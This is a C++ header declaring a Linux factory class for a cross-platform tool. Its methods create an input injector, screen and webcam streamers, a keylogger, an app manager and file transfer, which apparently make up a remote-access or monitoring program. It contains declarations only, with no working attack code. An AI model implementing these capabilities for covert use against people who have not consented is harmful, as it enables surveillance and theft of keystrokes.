#pragma once
#include "interfaces/IPlatformFactory.hpp"

#ifdef PLATFORM_LINUX

namespace platform {
namespace linux_platform {

// ============================================================================
// LinuxPlatformFactory - Factory for Linux platform components
// ============================================================================
// Creates Linux-specific implementations of all HAL interfaces.
// Handles both X11 and Wayland display servers where applicable.
// ============================================================================

class LinuxPlatformFactory final : public interfaces::IPlatformFactory {
public:
    LinuxPlatformFactory() = default;
    ~LinuxPlatformFactory() override = default;

    // ========== IPlatformFactory Implementation ==========

    std::unique_ptr<interfaces::IInputInjector> create_input_injector() override;
    std::unique_ptr<interfaces::IVideoStreamer> create_screen_streamer() override;
    std::unique_ptr<interfaces::IVideoStreamer> create_webcam_streamer() override;
    std::unique_ptr<interfaces::IKeylogger> create_keylogger() override;
    std::unique_ptr<interfaces::IAppManager> create_app_manager() override;
    std::unique_ptr<interfaces::IFileTransfer> create_file_transfer() override;

    const char* platform_name() const noexcept override { return "Linux"; }

    bool is_current_platform() const noexcept override {
        return PLATFORM_IS_LINUX;
    }

    void initialize() override;
    void shutdown() override;

private:
    bool initialized_ = false;
    bool is_wayland_ = false;  // Detected at runtime
};

} // namespace linux_platform
} // namespace platform

#endif // PLATFORM_LINUX
